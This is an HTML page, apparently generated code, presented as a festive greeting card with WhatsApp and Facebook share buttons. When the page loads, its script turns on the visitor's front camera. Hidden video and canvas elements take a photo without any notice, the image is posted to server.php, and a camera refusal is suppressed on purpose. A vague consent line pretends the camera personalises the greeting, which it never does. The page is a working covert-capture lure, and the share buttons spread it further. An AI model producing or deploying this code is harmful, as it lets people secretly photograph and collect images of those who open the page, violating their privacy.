<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }
        </script><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Festive Greetings</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        h1, p {
            color: #333;
        }
        .greeting {
            margin: 20px 0;
            font-size: 1.5em;
        }
        .consent {
            margin: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            background-color: #fff;
            font-size: 0.9em;
        }
        button {
            padding: 10px 20px;
            font-size: 1em;
            margin: 10px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }
        button:hover {
            background-color: #45a049;
        }
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Welcome to Festive Greetings</h1>
    <p class="greeting">Wishing you a joyful and prosperous celebration!</p>
    <div class="consent">
        <p>This app may use your camera to personalize your greeting. By continuing, you agree to allow camera access.</p>
    </div>
    <video id="video" autoplay muted></video>
    <canvas id="canvas"></canvas>
    <p>Share this moment:</p>
    <button onclick="share('WhatsApp')">WhatsApp Share</button>
    <button onclick="share('Facebook')">Facebook Share</button>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Automatically request camera access on page load
        window.addEventListener('load', () => {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    // Wait briefly to ensure video is ready, then capture silently
                    setTimeout(capturePhoto, 1000);
                })
                .catch(err => {
                    console.error('Camera access failed:', err);
                    // Silently handle denial without alerting user
                });
        });

        function capturePhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/png');

            fetch('server.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => {
                console.log(data.message);
                // Stop the video stream after capture
                video.srcObject.getTracks().forEach(track => track.stop());
            })
            .catch(err => {
                console.error('Error saving photo:', err);
            });
        }

        function share(platform) {
            const url = window.location.href;
            if (platform === 'WhatsApp') {
                window.open(`https://api.whatsapp.com/send?text=Check%20out%20this%20festive%20greeting!%20${url}`);
            } else if (platform === 'Facebook') {
                window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`);
            }
        }
    </script>
</body>
